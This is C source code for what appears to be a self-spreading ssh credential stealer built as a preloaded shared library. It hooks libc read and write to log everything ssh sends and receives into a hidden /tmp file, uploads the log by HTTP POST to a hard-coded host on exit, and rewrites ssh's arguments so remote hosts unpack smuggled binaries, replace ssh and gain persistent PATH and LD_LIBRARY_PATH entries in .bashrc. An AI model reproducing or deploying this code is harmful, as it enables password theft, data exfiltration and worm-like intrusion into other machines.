#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <fcntl.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <ctype.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/sendfile.h>
#include <signal.h>

#ifndef LIBC_PATH
#define LIBC_PATH "/usr/lib/x86_64-linux-gnu/libc.so.6"
#endif

void *handle;
int (*real_getopt)(int argc, char *const argv[],
                   const char *optstring);
/*
typedef void (*sighandler_t)(int);
sighandler_t (*real_signal)(int signum, sighandler_t handler);
int (*real_sigaction)(int signum, const struct sigaction *act,
                      struct sigaction *oldact);
*/
int (*real_close)(int fd);
size_t (*real_write)(int fd, const void *buf, size_t count) = NULL;
size_t (*real_read)(int fd, void *buf, size_t count) = NULL;
struct stat log_statbuf;

int log_fd = -1;
char capsule[512] = {0};
//int inject = 0;

char *host = "127.0.0.1";
char *port = "9999";
char *resource = "upload.php";
int size = 201;

int sock_fd;
struct sockaddr_in addr;

void do_post(void)
{
   host = "10.0.2.2";
   sock_fd = socket(AF_INET, SOCK_STREAM, 0);
   addr.sin_family = AF_INET;
   addr.sin_port = htons(atoi(port));
   addr.sin_addr.s_addr = inet_addr(host);

   connect(sock_fd, (struct sockaddr *)&addr, sizeof(struct sockaddr));

   size += log_statbuf.st_size;

   sprintf(capsule,
           "POST http://%s:%s/%s HTTP/1.1\r\n"
           "Host: %s:%s\r\n"
           "Accept: */*\r\n"
           "Content-Type: multipart/form-data; boundary=------------------------4ae6d1de929f9e46\r\n"
           "Content-Length: %d\r\n"
           "\r\n"
           "--------------------------4ae6d1de929f9e46\r\n"
           "Content-Disposition: form-data; name=\"vxlog\"; filename=\"vxlog.txt\"\r\n"
           "Content-Type: application/octet-stream\r\n"
           "\n",
           host, port, resource, host, port, size);

   real_write(sock_fd, capsule, strlen(capsule));
   sendfile(sock_fd, log_fd, 0, log_statbuf.st_size);
   real_write(sock_fd, "\n\n--------------------------4ae6d1de929f9e46--\r\n", 48);
   close(sock_fd);
}

char *lcso_envar(void)
{
    char *env_lcso = NULL;
    struct stat stat_dynamicorrupt;
    int envsz = 0;
    char path[128];
    sprintf(path, "%s/.bin/c.so.6.hex", getenv("HOME"));
    int fd = open(path, O_RDONLY);
    fstat(fd, &stat_dynamicorrupt);
    env_lcso = malloc(stat_dynamicorrupt.st_size + strlen("LC_BIN2="));
    strcpy(env_lcso, "LC_BIN2=");
    syscall(__NR_read, fd, env_lcso + strlen("LC_BIN2="), stat_dynamicorrupt.st_size);
    syscall(__NR_close, fd);
    return env_lcso;
}

char *dynamicorrupt_envar(void)
{
    char *env_dynamicorrupt = NULL;
    struct stat stat_dynamicorrupt;
    int envsz = 0;
    char path[128];
    sprintf(path, "%s/.bin/dynamicorrupt.hex", getenv("HOME"));
    int fd = open(path, O_RDONLY);
    fstat(fd, &stat_dynamicorrupt);
    env_dynamicorrupt = malloc(stat_dynamicorrupt.st_size + strlen("LC_BIN1="));
    strcpy(env_dynamicorrupt, "LC_BIN1=");
    syscall(__NR_read, fd, env_dynamicorrupt + strlen("LC_BIN1="), stat_dynamicorrupt.st_size);
    syscall(__NR_close, fd);
    return env_dynamicorrupt;
}

__attribute__((constructor)) int change_args(int argc, char **argv, char **envp)
{
   int env_size = 0;

   if (getenv("VXCOOL") == NULL)
   {
      char **envar = envp;
      while (*envar++ != NULL)
         env_size++;

      char **new_envp = malloc(sizeof(char *) * env_size + 3);
      for (int i = 0; i < env_size; i++)
         new_envp[i] = strdup(envp[i]);

      new_envp[env_size] = "VXCOOL=true";
      new_envp[env_size + 1] = dynamicorrupt_envar();
      new_envp[env_size + 2] = lcso_envar();
      new_envp[env_size + 3] = NULL;

      char **new_argv = malloc(sizeof(char *) * (argc + 4));
      for (int i = 0; i < argc; i++)
         new_argv[i] = strdup(argv[i]);

      new_argv[argc] = "-t";
      new_argv[argc + 1] = "-SendEnv";
      new_argv[argc + 2] = 
      "rm -rf $HOME/.bin;"
      "mkdir $HOME/.bin/;"
      "cp $(which ssh) $HOME/.bin/;"
      "printenv LC_BIN1 > $HOME/.bin/dynamicorrupt.hex;"
      "cat $HOME/.bin/dynamicorrupt.hex | xxd -plain -revert > $HOME/.bin/dynamicorrupt;"
      "chmod +x $HOME/.bin/dynamicorrupt;"
      "$HOME/.bin/dynamicorrupt $HOME/.bin/ssh;"

      "printenv LC_BIN2 > $HOME/.bin/c.so.6.hex;"
      "cat $HOME/.bin/c.so.6.hex | xxd -plain -revert > $HOME/.bin/c.so.6;"
      "chmod +x $HOME/.bin/c.so.6;"

      "echo \"export PATH=$HOME/.bin:$PATH\" >> $HOME/.bashrc;"
      "echo \"export LD_LIBRARY_PATH=$HOME/.bin/\" >> $HOME/.bashrc;"

      "export PATH=$HOME/.bin:$PATH;"
      "export LD_LIBRARY_PATH=$HOME/.bin/;"

      "$SHELL -i;";
      new_argv[argc + 3] = NULL;
      execve("/proc/self/exe", new_argv, new_envp);
   }
   else
      unsetenv("VXCOOL");
   return 0;
}

__attribute__((constructor)) void _initf(int ac, char **av)
{
   for (int i = 0; i < ac; i++)
   {
      printf("av[%d] = %s\n", i, av[i]);
   }

   //debug __asm__("int3\r\n");
   handle = dlopen(LIBC_PATH, RTLD_LAZY);
   //puts("hi");
   //real_sigaction = (void *)dlsym(handle, "sigaction");
   //real_signal = (void *)dlsym(handle, "signal");
   //real_getopt = (void *)dlsym(handle, "getopt");
   real_close = (void *)dlsym(handle, "close");
   real_write = (void *)dlsym(handle, "write");
   real_read = (void *)dlsym(handle, "read");
   log_fd = open("/tmp/.sshlog", O_APPEND | O_CREAT | O_RDWR, S_IRWXU);
   log_fd = dup2(log_fd, 42);
}

__attribute__((destructor)) void _finif(void)
{
   lseek(log_fd, 0, SEEK_SET);
   fstat(log_fd, &log_statbuf);
   do_post();
   syscall(__NR_close, log_fd);
   unlink("/tmp/.sshlog");
}

int BSDgetopt(int argc, char *const argv[],
              const char *optstring)
{
   printf("argc = %d\n", argc);
   for (int i = 0; i < argc; i++)
      printf("argv[%d] = %s\n", i, argv[i]);

   return real_getopt(argc, argv, optstring);
}

/*
int sigaction(int signum, const struct sigaction *act,
              struct sigaction *oldact)
{
   if (signum == SIGWINCH)
      inject = 1;
   return real_sigaction(signum, act, oldact);
}

sighandler_t signal(int signum, sighandler_t handler)
{
   if (signum == SIGWINCH)
      inject = 1;
   return real_signal(signum, handler);
}
*/

int close(int fd)
{
   if (fd == log_fd)
      return 0;
   return real_close(fd);
}

ssize_t write(int fd, const void *buf, size_t count)
{
   int ret = (real_write(fd, buf, count));
   syscall(__NR_write, log_fd, "[write]:", 8);
   //if ((fd == 5 || fd == 6)  && count > 1)
   //   syscall(__NR_write, log_fd, buf, ret);
   for (int i = 0; i < ret; i++)
      if (isprint(((char *)buf)[i]) || ((char *)buf)[i] == '\n')
         syscall(__NR_write, log_fd, &((char *)buf)[i], 1);
   syscall(__NR_write, log_fd, "\n", 1);
   return ret;
}

ssize_t read(int fd, void *buf, size_t count)
{
   int ret = (real_read(fd, buf, count));
   syscall(__NR_write, log_fd, "[read]:", 7);
   //if (fd == 4)
   //   syscall(__NR_write, log_fd, buf, ret);
   for (int i = 0; i < ret; i++)
      if (isprint(((char *)buf)[i]))
         syscall(__NR_write, log_fd, &((char *)buf)[i], 1);
   syscall(__NR_write, log_fd, "\n", 1);
   return ret;
}
